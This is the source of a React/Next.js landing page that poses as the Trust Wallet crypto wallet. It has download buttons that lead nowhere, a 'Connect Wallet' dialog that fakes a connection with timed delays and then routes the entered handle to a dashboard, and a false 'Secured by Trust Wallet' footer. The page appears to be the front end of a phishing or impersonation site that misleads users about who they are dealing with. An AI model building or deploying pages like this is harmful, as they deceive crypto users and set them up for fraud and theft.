"use client";

import React from "react";
import Image from "next/image";
import Link from "next/link";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Dialog, DialogContent, DialogTrigger, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { ShieldCheck, Loader2 } from "lucide-react";
import logo from "./logo.png";
import { useRouter } from "next/navigation";
import { toast } from "sonner";

export default function LandingPage() {
  const router = useRouter();
  const [handle, setHandle] = React.useState("");
  const [isOpen, setIsOpen] = React.useState(false);
  const [connectStatus, setConnectStatus] = React.useState<"idle" | "connecting" | "connected">("idle");

  const isValid = handle.trim().toLowerCase().endsWith("@trust");

  const handleConnect = () => {
    if (!isValid) {
      toast.error("Invalid Handle", { description: "Handle must end with @trust" });
      return;
    }

    setConnectStatus("connecting");

    // Simulate connection delay
    setTimeout(() => {
      setConnectStatus("connected");

      // Navigate after showing "Connected" briefly
      setTimeout(() => {
        router.push(`/dashboard?handle=${encodeURIComponent(handle)}`);
      }, 1000);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#1e3a8a] via-[#1e40af] to-[#4c1d95] flex flex-col items-center justify-between text-white relative overflow-hidden font-sans">

      {/* BACKGROUND EFFECTS */}
      <div className="absolute top-[-20%] left-[-20%] w-[50%] h-[50%] bg-blue-500/20 blur-[120px] rounded-full pointer-events-none" />
      <div className="absolute bottom-[-20%] right-[-20%] w-[50%] h-[50%] bg-purple-500/20 blur-[120px] rounded-full pointer-events-none" />

      {/* HEADER */}
      <header className="w-full p-6 flex items-center gap-2 z-10">
        <Image
          src={logo}
          alt="Trust Logo"
          width={32}
          height={32}
          className="rounded-lg"
        />
        <span className="text-[#60A5FA] font-bold text-xl tracking-wider">TRUST</span>
      </header>

      {/* MAIN CONTENT */}
      <main className="flex-1 w-full max-w-md flex flex-col items-center px-6 pb-12 z-10">

        {/* HERO IMAGE */}
        <div className="w-full relative aspect-square max-w-[340px] mb-6">
          <Image
            src="/Homepage-asset.png"
            alt="Trust Wallet Preview"
            fill
            className="object-contain"
            priority
          />
        </div>

        {/* TITLE SECTION */}
        <div className="flex flex-col items-center gap-1 mb-8 text-center">
          <h1 className="text-4xl font-black tracking-wide drop-shadow-xl text-white">
            TRUST WALLET
          </h1>
          <div className="h-6" />
          <h2 className="text-2xl font-bold text-white">Download Trust Wallet</h2>
          <p className="text-gray-200 font-medium">
            The most trusted & secure crypto wallet.
          </p>
        </div>

        {/* DOWNLOAD BUTTONS */}
        <div className="grid grid-cols-2 gap-4 w-full mb-10">
          <Button className="bg-white text-[#0055AA] hover:bg-gray-100 hover:scale-105 transition-transform font-bold h-14 rounded-full flex items-center justify-center gap-3 px-2 border-none">
            <span className="mt-0.5 text-xs sm:text-sm whitespace-nowrap">Download for iOS</span>
            <Image src="/iOS-icon.png" width={20} height={20} alt="iOS" className="object-contain" />
          </Button>
          <Button className="bg-white text-[#0055AA] hover:bg-gray-100 hover:scale-105 transition-transform font-bold h-14 rounded-full flex items-center justify-center gap-3 px-2 border-none">
            <span className="mt-0.5 text-xs sm:text-sm whitespace-nowrap">Download Extension</span>
            <Image src="/chrome-icon.png" width={20} height={20} alt="Chrome" className="object-contain" />
          </Button>
          <Button className="bg-white text-[#0055AA] hover:bg-gray-100 hover:scale-105 transition-transform font-bold h-14 rounded-full flex items-center justify-center gap-3 px-2 border-none">
            <span className="mt-0.5 text-xs sm:text-sm whitespace-nowrap">Download for APK</span>
            <Image src="/apk-icon.png" width={28} height={28} alt="APK" className="object-contain" />
          </Button>
          <Button className="bg-white text-[#0055AA] hover:bg-gray-100 hover:scale-105 transition-transform font-bold h-14 rounded-full flex items-center justify-center gap-3 px-2 border-none">
            <span className="mt-0.5 text-xs sm:text-sm whitespace-nowrap">Download Android</span>
            <Image src="/playstore-icon.png" width={20} height={20} alt="Android" className="object-contain" />
          </Button>
        </div>

        {/* ACTION BUTTON WITH DIALOG */}
        <div className="w-full flex flex-col gap-3">
          <Dialog open={isOpen} onOpenChange={setIsOpen}>
            <DialogTrigger asChild>
              <Button className="w-full bg-gradient-to-r from-[#2563EB] to-[#1E40AF] hover:from-[#3B82F6] hover:to-[#1E3A8A] text-white font-bold h-20 rounded-2xl text-lg shadow-[0_4px_20px_rgba(37,99,235,0.4)] hover:shadow-[0_6px_25px_rgba(37,99,235,0.5)] active:scale-[0.98] transition-all border border-blue-400/30 flex items-center justify-center gap-4">
                <div className="rounded-full bg-white/10 p-1">
                  <Image src={logo} width={32} height={32} alt="logo" className="rounded-full" />
                </div>
                <span>Enter your trust wallet handle</span>
              </Button>
            </DialogTrigger>
            <DialogContent className="sm:max-w-md bg-[#1e3a8a] border-blue-400/30 text-white">
              <DialogHeader>
                <DialogTitle className="text-center text-xl font-bold">Connect Wallet</DialogTitle>
              </DialogHeader>
              <div className="flex flex-col gap-4 py-4">
                <div className="space-y-2">
                  <Input
                    placeholder="Enter your Trust Wallet handle (e.g. name@trust)"
                    value={handle}
                    onChange={(e) => {
                      setHandle(e.target.value);
                      if (e.target.value && !e.target.value.toLowerCase().endsWith("@trust")) {
                        // Optional: Could show inline error/warning here if desired
                      }
                    }}
                    className="bg-black/20 border-blue-400/30 text-white placeholder:text-gray-400 h-12 text-lg"
                  />
                  {!isValid && handle.length > 0 && (
                    <p className="text-xs text-red-300 ml-1 animate-pulse">
                      Please enter a valid Trust Wallet handle @trust
                    </p>
                  )}
                </div>

                <Button
                  onClick={handleConnect}
                  disabled={!isValid || connectStatus !== "idle"}
                  className="w-full bg-gradient-to-r from-[#2563EB] to-[#1E40AF] hover:from-[#3B82F6] hover:to-[#1E3A8A] text-white font-bold h-12 rounded-xl border border-blue-400/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
                >
                  {connectStatus === "connecting" ? (
                    <div className="flex items-center gap-2">
                      <Loader2 className="animate-spin" size={20} />
                      <span>Connecting...</span>
                    </div>
                  ) : connectStatus === "connected" ? (
                    <div className="flex items-center gap-2 text-green-300">
                      <ShieldCheck size={20} />
                      <span>Connected</span>
                    </div>
                  ) : (
                    "Connect Wallet"
                  )}
                </Button>
              </div>
            </DialogContent>
          </Dialog>

          <p className="text-xs text-center text-gray-400 font-medium tracking-wide opacity-80">
            Make sure to enter a valid Trust Wallet handle
          </p>
        </div>

      </main>

      {/* FOOTER */}
      <footer className="w-full pb-8 flex justify-center z-10">
        <div className="flex items-center gap-2 text-[10px] font-bold uppercase tracking-[0.2em] text-gray-400/60">
          <ShieldCheck size={14} />
          Secured by Trust Wallet
        </div>
      </footer>
    </div>
  );
}
